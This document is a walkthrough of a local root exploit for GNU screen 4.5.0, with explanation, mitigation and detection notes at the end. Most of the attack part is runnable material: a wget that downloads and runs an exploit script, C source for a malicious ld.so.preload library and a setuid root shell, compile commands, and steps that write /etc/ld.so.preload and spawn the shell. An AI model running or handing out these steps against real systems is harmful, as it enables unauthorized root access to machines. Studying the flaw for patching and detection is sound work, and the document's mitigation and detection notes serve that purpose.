### Check [screen](https://linux.die.net/man/1/screen) version
```bash
screen -v
```

### Download the exploit script (if you don't have it)
```bash
wget https://raw.githubusercontent.com/infernusinvictus/linux-exploit-suggestions/master/screen-4.5.0/screen_exploit.sh # or the location of your exploit.
```

### Make the script executable
```bash
chmod +x screen_exploit.sh
```

### Run the exploit (replace ~ with the target user's home directory)
```bash
./screen_exploit.sh ~ gnu/screenroot ~
```

### If the script doesn't work directly, try the commands manually:

#### 1. Create libhax.c
```bash
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
```

#### 2. Compile libhax.c
```bash
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
```

#### 3. Create rootshell.c
```bash
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
#include <unistd.h>

int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
```

#### 4. Compile rootshell.c
```bash
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
```

#### 5. Create /etc/ld.so.preload
```bash
cd /etc
umask 000 # Very important!
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so" # Newline is crucial
```

#### 6. Trigger the exploit
```bash
screen -ls
```

#### 7. Execute the root shell
```bash
/tmp/rootshell
```

### Cleanup (always a good idea)
```bash
rm /tmp/libhax.so
rm /tmp/rootshell
rm /etc/ld.so.preload # Sometimes the exploit does not remove it.
```

## **Vulnerability:**

- **Version 4.5.0 and below:** The `screen` utility in these versions lacks proper permission checks when creating or truncating log files.
- **Arbitrary File Write:** This allows an attacker to write to or create files with root privileges, leading to privilege escalation.
- **`ld.so.preload` Abuse:** The exploit leverages this vulnerability to manipulate the `ld.so.preload` file, which specifies shared libraries to load before others. By pointing it to a malicious library, arbitrary code can be executed with root privileges.

### **Exploitation Steps (as shown in the script):**

1. **Create Malicious Library (`libhax.so`):**
    - A C library is created that, upon loading, changes the ownership and permissions of a shell executable (`/tmp/rootshell`) to root and sets the SUID bit.
    - It also removes the `ld.so.preload` file to clean up.
2. **Create Root Shell (`rootshell`):**
    - A simple C program is created that spawns a root shell using `setuid(0)` and related functions.
3. **Create `ld.so.preload`:**
    - The script uses `screen`'s logging feature to write the path to the malicious library (`/tmp/libhax.so`) into `/etc/ld.so.preload`. The `umask 000` is very important, as it ensures that the file is created with the needed permissions.
4. **Trigger the Vulnerability:**
    - Running `screen -ls` triggers the vulnerability. Because screen is a SUID binary, when it runs, it loads the `ld.so.preload` library, and the code within the library executes.
5. **Root Shell:**
    - The malicious library changes the permissions of `/tmp/rootshell`, and the script then executes it, providing a root shell.

### **Key Points and Considerations:**

- **SUID Binaries:** The exploit relies on `screen` being a SUID binary. This is a common requirement for many privilege escalation exploits.
- **`ld.so.preload`:** Understanding how `ld.so.preload` works is crucial for understanding this exploit. It is a powerful but dangerous feature.
- **Clean Up:** The exploit includes steps to clean up after itself, such as removing the malicious library and `ld.so.preload`. This is good practice but not always guaranteed.
- **Mitigation:**
    - **Update `screen`:** The primary mitigation is to update to a patched version of `screen`.
    - **Remove SUID bit:** If updating is not possible, removing the SUID bit from `screen` will prevent this exploit, but it may break functionality.
    - **File System Permissions:** Proper file system permissions can help prevent unauthorized modification of critical system files.
- **Real-World Scenarios:** This exploit is a good example of how seemingly minor vulnerabilities can lead to significant security breaches.
- **Exploit variations:** There are slight variations of this exploit. For example, instead of removing the preload file, the malicious library may replace its content with a blank line.
- **Detection:** This type of exploit can be detected by monitoring changes to `/etc/ld.so.preload` and by detecting suspicious SUID binaries. Monitoring for unexpected root shells is also important.
- **Containerization:** In containerized environments, this vulnerability may be less impactful, as the container's root user is typically isolated from the host's root user. However, container escape vulnerabilities can still occur.
